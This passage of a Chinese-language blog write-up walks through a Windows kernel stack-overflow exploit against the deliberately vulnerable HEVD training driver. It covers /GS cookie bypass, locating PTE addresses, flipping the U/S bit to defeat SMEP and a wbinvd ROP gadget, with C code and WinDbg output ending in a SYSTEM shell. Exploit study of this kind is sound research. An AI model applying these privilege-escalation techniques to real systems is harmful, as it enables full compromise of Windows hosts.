+ffffed09`92d33a18  46 c6 81 72 00 f8 ff ff-00 00 00 00 00 00 00 00  F..r............
+
+0: kd&gt; g
+Breakpoint 1 hit
+HEVD!TriggerBufferOverflowStackGS:
+fffff800`746866e0 48895c2418      mov     qword ptr [rsp+18h],rbx
+2: kd&gt; kb
+ # RetAddr               : Args to Child                                                           : Call Site
+00 fffff800`746866da     : 00000000`00000010 00000000`00050282 ffffed09`92d337c8 00000000`00000018 : HEVD!TriggerBufferOverflowStackGS [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 70] 
+01 fffff800`74685223     : ffffbc24`a0997c89 00000000`00000000 fffff800`74688300 00000000`00222007 : HEVD!BufferOverflowStackGSIoctlHandler+0x1a [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 148] 
+02 fffff800`724316b5     : ffff8806`44eca820 00000000`00000002 00000000`00000001 ffff8806`469b02c0 : HEVD!IrpDeviceIoCtlHandler+0x1ab [c:\projects\hevd\driver\hevd\hacksysextremevulnerabledriver.c @ 282] 
+03 fffff800`7281d4c8     : ffffed09`92d33b80 ffff8806`44eca820 00000000`00000001 ffff8806`00000000 : nt!IofCallDriver+0x55
+04 fffff800`7281d2c7     : ffff8806`00000000 ffffed09`92d33b80 00000000`00000000 ffffed09`92d33b80 : nt!IopSynchronousServiceTail+0x1a8
+05 fffff800`7281c646     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0xc67
+06 fffff800`72611ab5     : ffffed09`92d33b80 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtDeviceIoControlFile+0x56
+07 00007ffb`0196d1a4     : 00007ffa`ff01572b 00000000`00000000 00002032`98feca86 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25
+08 00007ffa`ff01572b     : 00000000`00000000 00002032`98feca86 00000000`00000000 00007ffb`018e6777 : 0x00007ffb`0196d1a4
+09 00000000`00000000     : 00002032`98feca86 00000000`00000000 00007ffb`018e6777 0000005c`ec6ff4c0 : 0x00007ffa`ff01572b
+2: kd&gt; s rsp L1000 46 c6 81 72 00 f8 ff ff
+ffffed09`92d33a18  46 c6 81 72 00 f8 ff ff-00 00 00 00 00 00 00 00  F..r............
+
+3: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0x1b:
+fffff800`746866fb 4833c4          xor     rax,rsp
+3: kd&gt; r rsp
+rsp=ffffed0992d33540
+</code></pre><p>可以发现在触发这两个 handler 函数时，作为锚点的返回地址位于栈中的相同位置，而计算 xored_security_cookie 的栈顶地址为 <code>ffffed0992d33540</code>，和锚点的偏移是 0x4D8。因此只需要找到锚点，然后减去 0x4D8 就可以获得 RSP 的数值了。</p>
+<h3 id="44-smep-绕过">4.4 SMEP 绕过</h3>
+<h4 id="441-如何获得-pte-地址">4.4.1 如何获得 PTE 地址</h4>
+<p>内核中存在一个 <code>MiGetPteAddress</code> 函数，输入参数为虚拟地址，返回值是地址对应的 PTE 地址，该函数如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">MiGetPteAddress</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> va)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ((va <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">9</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7FFFFFFFF8</span>i64) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xFFFFF68000000000u</span>i64;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>注意其中的数值 <code>0xFFFFF68000000000ui64</code>，这就是 PTE 的基地址，但是由于随机化的原因，这个地址在使用 Windbg 动态反编译时就发生了改变：</p>
+<pre tabindex="0"><code>3: kd&gt; uf nt!MiGetPteAddress
+nt!MiGetPteAddress:
+fffff805`05af5f10 48c1e909              shr     rcx,9
+fffff805`05af5f14 48b8f8ffffff7f000000  mov rax,7FFFFFFFF8h
+fffff805`05af5f1e 4823c8                and     rcx,rax
+fffff805`05af5f21 48b80000000000a2ffff  mov rax,0FFFFA20000000000h
+fffff805`05af5f2b 4803c1                add     rax,rcx
+fffff805`05af5f2e c3                    ret
+</code></pre><p>最好的方法是调用这个函数得到 PTE 地址，但是这并不是一个导出函数，因此需要想办法获取到 <code>MiGetPteAddress</code> 函数的地址，然后在偏移 0x13 的位置读取到 PTE 的基地址，使用 <code>MiGetPteAddress</code> 函数中的计算方法得到 PTE 地址。</p>
+<p>有两种方法可以获取到 <code>MiGetPteAddress</code> 函数的地址：</p>
+<ol>
+<li>
+<p>在内核代码段搜索函数的 signature</p>
+<p>我使用计算函数 signature 的方法在 ntoskrnl.exe 的 .text 段中进行搜索，signature 的计算方式沿用了参考资料[6]中的方法，但是在定位 .text 段时采用的不同的方式，原因可以看下面的<strong>知识点积累</strong>。</p>
+</li>
+<li>
+<p>在调用函数中搜索 call 指令</p>
+<p>该方法来自参考资料[8]，本来是用来搜索 <code>HMValidateHandle</code> 函数的地址，从而泄露内核地址，可以使用同样的方法找到 <code>MiGetPteAddress</code> 函数的地址，在引用 <code>MiGetPteAddress</code> 的函数中找到导出函数 <code>MmLockPreChargedPagedPool</code>，这个函数很短，而且在进入函数不久就调用了 <code>MiGetPteAddress</code>：</p>
+<pre tabindex="0"><code>                               public MmLockPreChargedPagedPool
+                               MmLockPreChargedPagedPool proc near
+ 48 83 EC 28                   sub     rsp, 28h
+ 4C 8B C1                      mov     r8, rcx
+ E8 24 2D B7 FF                call    MiGetPteAddress
+ 48 8D 8A FF 0F 00 00          lea     rcx, [rdx+0FFFh]
+ 41 81 E0 FF 0F 00 00          and     r8d, 0FFFh
+ 49 03 C8                      add     rcx, r8
+ 41 B9 01 00 00 00             mov     r9d, 1
+ 48 C1 E9 0C                   shr     rcx, 0Ch
+ 48 8B D0                      mov     rdx, rax
+ 48 FF C9                      dec     rcx
+ 4C 8D 04 C8                   lea     r8, [rax+rcx*8]
+ 33 C9                         xor     ecx, ecx
+ E8 A8 7E B4 FF                call    MiLockCode
+ 48 83 C4 28                   add     rsp, 28h
+ C3                            retn
+</code></pre><p>然后搜索机器码 <code>E8</code> 就能获得 <code>MiGetPteAddress</code> 的地址了。</p>
+</li>
+</ol>
+<h4 id="442-修改-us-字段">4.4.2 修改 U/S 字段</h4>
+<p>在 <a href="https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g">X64 分页机制</a> 中介绍了 PTE 的结构如下：</p>
+<pre tabindex="0"><code>| |   62:52   |          51:12          |          11:0         |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|X|           |                         | | | | |P| | |P|P|U|R| |
+|D|     i     |           PFN           |i|i|i|G|A|D|A|C|W|/|/|P|
+| |           |                         | | | | |T| | |D|T|S|W| |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+</code></pre><p>U/S 字段位于第 2 位，只需要与 0x4 进行异或就能实现 U/S 字段的修改。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">ChangeUS</span>(ULONGLONG pteAddr) {
+</span></span><span style="display:flex;"><span>	PULONGLONG pte <span style="color:#f92672">=</span> (PULONGLONG)VirtualAlloc(NULL, <span style="color:#ae81ff">8</span>, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pte <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[!] FATAL: Error allocating memeory for pte</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	ReadData(pte, (PULONGLONG)pteAddr, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>	ULONGLONG pteValue <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pte;
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;[+] Pte for shellcode is 0x%I64x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pteValue);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	BOOL status <span style="color:#f92672">=</span> WriteData(pteAddr, pteValue <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x4</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	VirtualFree(pte, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> status;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以看到修改完 U/S 字段之后，PTE 中该字段标志变成了 K。</p>
+<pre tabindex="0"><code>1: kd&gt; !process  0 0 StackOverflowGS.exe
+PROCESS ffff82018712a080
+    SessionId: 1  Cid: 16f4    Peb: 5677005000  ParentCid: 1830
+    DirBase: 6de97000  ObjectTable: ffffd20318965540  HandleCount:  46.
+    Image: StackOverflowGS.exe
+1: kd&gt; .process /p ffff82018712a080
+Implicit process is now ffff8201`8712a080
+.cache forcedecodeuser done
+1: kd&gt; !pte 1c5733b0000
+                                           VA 000001c5733b0000
+PXE at FFFFF77BBDDEE018    PPE at FFFFF77BBDC038A8    PDE at FFFFF77B80715CC8    PTE at 	FFFFF700E2B99D80
+contains 0000000000000000
+contains 0000000000000000
+not valid
+1: kd&gt; !pte FFFFF700E2B99D80 1
+                                           VA fffff700e2b99d80
+PXE at FFFFF700E2B99D80    PPE at FFFFF700E2B99D80    PDE at FFFFF700E2B99D80    PTE at 	FFFFF700E2B99D80
+contains 0100000071227843  contains 0100000071227843  contains 0100000071227843  contains 	0100000071227843
+pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV
+</code></pre><h4 id="443-确定覆盖缓冲区大小">4.4.3 确定覆盖缓冲区大小</h4>
+<p>因为在漏洞函数中目的缓冲区的大小有 512 字节，为了避免溢出导致崩溃机器重启，先设置一个 0x100 的缓冲区，调试确定缓冲区起始地址和返回地址之间距离，以及 xored_security_cookie 存储的位置。</p>
+<pre tabindex="0"><code>3: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0x3e:
+fffff800`7468671e e8ddadf7ff      call    HEVD!memset (fffff800`74601500)
+3: kd&gt; r 
+rax=ffffac48d2424401 rbx=0000000000000000 rcx=ffffed0993030560
+rdx=0000000000000000 rsi=0000000000000100 rdi=00000036192ff5c0
+rip=fffff8007468671e rsp=ffffed0993030540 rbp=ffff8806463fb1a0
+ r8=0000000000000200  r9=000000000000004d r10=fffff80074685078
+r11=ffffed09930307c8 r12=0000000000000200 r13=0000000000000000
+r14=ffff8806463fb270 r15=ffff8806443d4a80
+iopl=0         nv up ei pl zr na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
+HEVD!TriggerBufferOverflowStackGS+0x3e:
+fffff800`7468671e e8ddadf7ff      call    HEVD!memset (fffff800`74601500)
+</code></pre><p>这里确定缓冲区的起始地址是 <code>rcx=ffffed0993030560</code>，大小是 <code>r8=0000000000000200</code>。</p>
+<pre tabindex="0"><code>1: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0xf6:
+fffff800`746867d6 8bc3            mov     eax,ebx
+1: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0xf8:
+fffff800`746867d8 488b8c2420020000 mov     rcx,qword ptr [rsp+220h]
+1: kd&gt; ? rsp + 220h
+Evaluate expression: -20849599772832 = ffffed09`93030760
+</code></pre><p>这里确定 xored_security_cookie 保存在 <code>ffffed0993030760</code>。</p>
+<pre tabindex="0"><code>1: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0x11f:
+fffff800`746867ff c3              ret
+1: kd&gt; r rsp
+rsp=ffffed0993030798
+</code></pre><p>这里确定返回地址保存在 <code>ffffed0993030798</code>。</p>
+<p>由以上结果，确定 xored_security_cookie 偏移为 0x200，返回地址偏移为 0x238。</p>
+<h4 id="444-tlb-缓存清理">4.4.4 TLB 缓存清理</h4>
+<p>其实在没有进行这一步之前，可能是因为我一直回退到干净版本镜像的原因，我的漏洞利用已经成功了，但是考虑到这个步骤在漏洞利用中比较通用，因此也学习一下，并把它加入到漏洞利用程序中。</p>
+<p>TLB 缓存的问题很好解决，只需要通过 wbinvd 指令更新并禁用缓存。使用 RP++ 找到 gadget 地址：</p>
+<pre tabindex="0"><code>0x380640: wbinvd ; ret ; \x0f\x09\xc3 (1 found)
+</code></pre><p>最后的缓冲区结构为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Start to exploit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x248</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[+] Preparing exploit buffer!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>memset(buffer, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(buffer));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// xored securty cookie
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>memcpy(<span style="color:#f92672">&amp;</span>buffer[COOKIE_OFFSET], <span style="color:#f92672">&amp;</span>xored_cookie, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// return address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>memcpy(<span style="color:#f92672">&amp;</span>buffer[RTN_OFFSET], <span style="color:#f92672">&amp;</span>wbinvdAddr, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>memcpy(<span style="color:#f92672">&amp;</span>buffer[RTN_OFFSET<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], <span style="color:#f92672">&amp;</span>shellcode, <span style="color:#ae81ff">8</span>);
+</span></span></code></pre></div><h3 id="45-结果">4.5 结果</h3>
+<pre tabindex="0"><code>PS C:\Users\patch\Desktop&gt; C:\Users\patch\Desktop\StackOverflowGS.exe
+[+] HEVD StackOverflowGS exploit
+[+] Obtaining Driver Base Address!
+[+] HEVD.sys is located at: 0xfffff80074600000
+[+] Locating function!
+[+] fileBase is 0xfffff80074600000
+[+] elfanew is 0xd8
+[+] numberOfSections is 0x7
+[+] sizeOfOptionalHeader is 0xf0
+[+] Found .text section, not .data, continue...
+[+] Found .rdat section, not .data, continue...
+[+] hevdDataSection is 0xfffff80074603000
+[+] New cookie value is 0x414141414141!
+[+] Found StackOverflowGS.exe
+[+] StackBase is 0xffffed0992b0a000, StackLimit is 0x ffffed0992b04000
+[+] Obtaining Driver Base Address!
+[+] ntoskrnl.exe is located at: 0xfffff80072207000
+[+] ntoskrnl.exe is 0x7ff7e9f80000
+[+] NtDeviceIoControlFile is 0x7ff7ea5955f0
+[+] Anchor is 0xfffff8007281c646
+[+] AnchorAddr is ffffed0992b09a18
+[+] RSP is ffffed0992b09540
+[+] Creating shellcode.
+[+] Shellcode allocated at: 0x0000023767260000
+[+] Getting pte for shellcode.
+[+] Obtaining Driver Base Address!
+[+] ntoskrnl.exe is located at: 0xfffff80072207000
+[+] Obtaining Driver Base Address!
+[+] ntoskrnl.exe is located at: 0xfffff80072207000
+[+] ntoskrnl.exe is 0x7ff7e9f80000
+[+] MmLockPreChargedPagedPool is 0x7ff7ea6eb1e0
+MiGetPteAddress from locatefun2 is fffff800724e4f10
+[+] Rerutn from LocateFunc!
+Reading data at fffff800724e4f23
+[+] The base address of PTE is 0xfffffc0000000000
+[+] Pte Address of shellcode is 0xfffffc011bb39300
+[+] Changing U/S of pte.
+[+] Pte for shellcode is 0x4006a867
+[+] Preparing exploit buffer!
+[+] Opening handle to \\.\HacksysExtremeVulnerableDriver
+
+C:\&gt;whoami
+nt authority\system
+</code></pre><h2 id="5-知识点积累">5. 知识点积累</h2>
+<ol>
+<li>64 位系统的 SEH 处理机制；</li>
+<li>/GS 绕过方法；</li>
+<li>任意写漏洞也可以实现任意读；</li>
+<li>确定<code>MiGetPteAddress</code> 函数地址的方法，以及：
+<ol>
+<li>从 <code>EnumDeviceDrivers</code> 函数获取的驱动地址是内核基地址，不能直接在代码中读取其内容，需要利用任意读漏洞；使用 <code>LoadLibraryA</code> 得到的句柄值是将驱动加载到当前进程的内存空间中之后的基地址，可以直接在代码中读取其内容，但是此种方式得到的 PTE 基地址没用。</li>
+<li>获得代码段地址时，通过 <code>IMAGE_OPTIONAL_HEADER</code> 获取的代码段基址实际上是 .rdata 的基址，如果从这里按顺序读取数据会访问到不可访问的地址，应该从 .text 的 <code>IMAGE_SECTION_HEADER</code> 处读取偏移量和大小。</li>
+</ol>
+</li>
+<li>在 windbg 中使用 <code>!pte</code> 显示某个虚拟地址的 pte 地址之前，需要先转换到对应进程的上下文。</li>
+<li>!pte 命令执行报错 <code>Levels not implemented for this platform</code>
+这个没有找到好的解决办法，我尝试安装了低版本的 WDK，当时问题解决了，但是过几天再次尝试时又失败了。</li>
+<li>cmp 和 test 汇编指令的区别（这个真的总是弄混）</li>
+<li>TLB 缓存禁用的方法</li>
+</ol>
+<h2 id="6-参考资料">6. 参考资料</h2>
+<ol>
+<li><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">分析文章</a></li>
+<li><a href="https://www.cs.purdue.edu/homes/xyzhang/spring07/Papers/defeat-stackguard.pdf">Four different tricks to bypass StackShield and StackGuard protection</a></li>
+<li><a href="https://www.osronline.com/article.cfm%5earticle=469.htm#:~:text=Because%20the%20x64,within%20the%20module">Exceptional Behavior - x64 Structured Exception Handling</a></li>
+<li><a href="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/">Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</a></li>
+<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf">Windows 10 Mitigation Improvements</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf">TAKING WINDOWS 10 KERNEL EXPLOITATION TO THE NEXT LEVEL</a></li>
+<li><a href="https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g">X64 分页机制</a></li>
+<li><a href="https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp">MValidateHandle 泄露内核地址</a></li>
+</ol>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5 0 11V3C0 1.5.8.8.8.8S1.5 0 3 0h8c1.5 0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/hevd/" rel="tag">HEVD</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/exploit/" rel="tag">exploit</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/binary/" rel="tag">binary</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="zoemurmure avatar" src="/img/avatar.jpg" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About zoemurmure</span>
+	</div>
+	<div class="authorbox__description">
+		二进制安全研究菜鸟
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/hevd_stackoverflow/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">[HEVD exploit 系列] StackOverflow</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/x64_paging/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">X64 分页机制</p>
+		</a>
+	</div>
+</nav>
+
+<section class="comments">
+	<div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "logic-gate" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 Logic Security 逻辑门.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+<script src="/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
